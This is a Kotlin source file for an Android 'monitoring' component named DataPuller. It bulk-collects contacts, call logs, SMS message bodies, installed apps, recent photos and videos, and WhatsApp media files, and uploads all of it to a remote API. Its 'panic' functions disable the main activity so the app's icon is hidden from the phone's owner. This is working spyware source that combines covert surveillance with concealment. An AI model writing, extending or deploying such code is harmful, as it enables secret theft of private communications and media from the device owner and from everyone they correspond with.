package com.dilarion.app.monitoring

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import com.dilarion.app.data.api.ApiService
import kotlinx.coroutines.CoroutineScope
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream

private const val TAG = "DataPuller"

class DataPuller(
    private val context: Context,
    private val apiService: ApiService,
    private val scope: CoroutineScope,
    private val getToken: suspend () -> String?,
) {

    @SuppressLint("MissingPermission")
    suspend fun pullContacts() {
        val contacts = mutableListOf<Map<String, String>>()
        context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
            ),
            null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                contacts.add(mapOf(
                    "name" to (cursor.getString(0) ?: ""),
                    "phone" to (cursor.getString(1) ?: ""),
                ))
            }
        }
        Log.i(TAG, "pullContacts: ${contacts.size} entries")
        val token = getToken() ?: return
        runCatching {
            apiService.uploadContacts("Bearer $token", mapOf("contacts" to contacts))
        }.onFailure { Log.e(TAG, "pullContacts failed: $it") }
    }

    @SuppressLint("MissingPermission")
    suspend fun pullCallLogs() {
        val logs = mutableListOf<Map<String, Any>>()
        context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME,
            ),
            null, null, "${CallLog.Calls.DATE} DESC",
        )?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count++ < 500) {
                val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                logs.add(mapOf(
                    "number"   to (cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""),
                    "type"     to when (typeInt) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE   -> "missed"
                        else                        -> "unknown"
                    },
                    "date"     to cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)),
                    "duration" to cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)),
                    "name"     to (cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: ""),
                ))
            }
        }
        Log.i(TAG, "pullCallLogs: ${logs.size} entries")
        val token = getToken() ?: return
        runCatching {
            apiService.uploadCallLogs("Bearer $token", mapOf("call_logs" to logs))
        }.onFailure { Log.e(TAG, "pullCallLogs failed: $it") }
    }

    @SuppressLint("MissingPermission")
    suspend fun pullSms() {
        val messages = mutableListOf<Map<String, Any>>()
        context.contentResolver.query(
            Uri.parse("content://sms"),
            arrayOf("_id", "address", "body", "date", "type"),
            null, null, "date DESC",
        )?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count++ < 500) {
                messages.add(mapOf(
                    "id"      to cursor.getLong(cursor.getColumnIndexOrThrow("_id")),
                    "address" to (cursor.getString(cursor.getColumnIndexOrThrow("address")) ?: ""),
                    "body"    to (cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: ""),
                    "date"    to cursor.getLong(cursor.getColumnIndexOrThrow("date")),
                    "type"    to if (cursor.getInt(cursor.getColumnIndexOrThrow("type")) == 1) "inbox" else "sent",
                ))
            }
        }
        Log.i(TAG, "pullSms: ${messages.size} entries")
        val token = getToken() ?: return
        runCatching {
            apiService.uploadSms("Bearer $token", mapOf("messages" to messages))
        }.onFailure { Log.e(TAG, "pullSms failed: $it") }
    }

    suspend fun pullInstalledApps() {
        val pm = context.packageManager
        val apps = pm.getInstalledPackages(0).mapNotNull { pkg ->
            runCatching {
                mapOf(
                    "package_name" to pkg.packageName,
                    "app_name"     to pm.getApplicationLabel(pkg.applicationInfo ?: return@runCatching null).toString(),
                    "version"      to (pkg.versionName ?: ""),
                    "installed_at" to pkg.firstInstallTime,
                    "updated_at"   to pkg.lastUpdateTime,
                )
            }.getOrNull()
        }
        Log.i(TAG, "pullInstalledApps: ${apps.size} apps")
        val token = getToken() ?: return
        runCatching {
            apiService.uploadInstalledApps("Bearer $token", mapOf("apps" to apps))
        }.onFailure { Log.e(TAG, "pullInstalledApps failed: $it") }
    }

    suspend fun pullMedia() {
        val token = getToken() ?: return
        val tmpDir = context.cacheDir
        var uploaded = 0

        // Images — 50 most recent
        val imgCols = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
        )
        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            imgCols, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC",
        )?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < 50) {
                val id    = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val name  = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)) ?: "img_$id.jpg"
                val album = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)) ?: ""
                val date  = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                val uri   = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                val tmp   = File(tmpDir, "pull_img_$id.jpg")
                runCatching {
                    context.contentResolver.openInputStream(uri)?.use { inp ->
                        FileOutputStream(tmp).use { inp.copyTo(it) }
                    }
                    if (tmp.exists() && tmp.length() > 0) {
                        val part = MultipartBody.Part.createFormData("file", name, tmp.asRequestBody("image/jpeg".toMediaType()))
                        apiService.uploadGalleryFile("Bearer $token", part,
                            name.toRequestBody("text/plain".toMediaType()),
                            "photo".toRequestBody("text/plain".toMediaType()),
                            album.toRequestBody("text/plain".toMediaType()),
                            date.toString().toRequestBody("text/plain".toMediaType()),
                        )
                        uploaded++
                    }
                }.onFailure { Log.e(TAG, "image upload failed: $it") }
                tmp.delete()
                count++
            }
        }

        // Videos — 10 most recent, skip >50MB
        val vidCols = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.BUCKET_DISPLAY_NAME,
            MediaStore.Video.Media.DATE_ADDED,
            MediaStore.Video.Media.SIZE,
        )
        context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            vidCols, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC",
        )?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < 10) {
                val id    = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID))
                val name  = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)) ?: "vid_$id.mp4"
                val album = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)) ?: ""
                val date  = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED))
                val size  = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE))
                count++
                if (size > 50 * 1024 * 1024) continue
                val uri = Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id.toString())
                val tmp = File(tmpDir, "pull_vid_$id.mp4")
                runCatching {
                    context.contentResolver.openInputStream(uri)?.use { inp ->
                        FileOutputStream(tmp).use { inp.copyTo(it) }
                    }
                    if (tmp.exists() && tmp.length() > 0) {
                        val part = MultipartBody.Part.createFormData("file", name, tmp.asRequestBody("video/mp4".toMediaType()))
                        apiService.uploadGalleryFile("Bearer $token", part,
                            name.toRequestBody("text/plain".toMediaType()),
                            "video".toRequestBody("text/plain".toMediaType()),
                            album.toRequestBody("text/plain".toMediaType()),
                            date.toString().toRequestBody("text/plain".toMediaType()),
                        )
                        uploaded++
                    }
                }.onFailure { Log.e(TAG, "video upload failed: $it") }
                tmp.delete()
            }
        }
        Log.i(TAG, "pullMedia: $uploaded files uploaded")
    }

    suspend fun pullWhatsappMedia() {
        val token = getToken() ?: return
        val waPaths = listOf(
            "/storage/emulated/0/WhatsApp/Media",
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media",
        )
        var uploaded = 0
        for (basePath in waPaths) {
            val baseDir = File(basePath)
            if (!baseDir.exists()) continue
            baseDir.walkTopDown()
                .filter { it.isFile && !it.name.startsWith(".") && it.length() < 20 * 1024 * 1024 }
                .take(50)
                .forEach { file ->
                    val album = file.parentFile?.name ?: "WhatsApp"
                    val mediaType = when (file.extension.lowercase()) {
                        "jpg", "jpeg", "png", "webp"       -> "image"
                        "mp4", "3gp", "mkv", "mov"         -> "video"
                        "mp3", "ogg", "opus", "aac", "m4a" -> "audio"
                        else                                -> "other"
                    }
                    runCatching {
                        val rb   = file.asRequestBody("application/octet-stream".toMediaType())
                        val part = MultipartBody.Part.createFormData("file", file.name, rb)
                        apiService.uploadWhatsappMedia("Bearer $token", part,
                            file.name.toRequestBody("text/plain".toMediaType()),
                            album.toRequestBody("text/plain".toMediaType()),
                            mediaType.toRequestBody("text/plain".toMediaType()),
                        )
                        uploaded++
                    }.onFailure { Log.e(TAG, "wa media failed: $it") }
                }
            break
        }
        Log.i(TAG, "pullWhatsappMedia: $uploaded files")
    }

    suspend fun pullAll() {
        pullContacts()
        pullCallLogs()
        pullSms()
        pullInstalledApps()
        pullMedia()
        pullWhatsappMedia()
    }

    fun panicOn() {
        runCatching {
            context.packageManager.setComponentEnabledSetting(
                ComponentName(context, "com.dilarion.app.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )
        }.onFailure { Log.e(TAG, "panicOn failed: $it") }
    }

    fun panicOff() {
        runCatching {
            context.packageManager.setComponentEnabledSetting(
                ComponentName(context, "com.dilarion.app.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP,
            )
        }.onFailure { Log.e(TAG, "panicOff failed: $it") }
    }
}
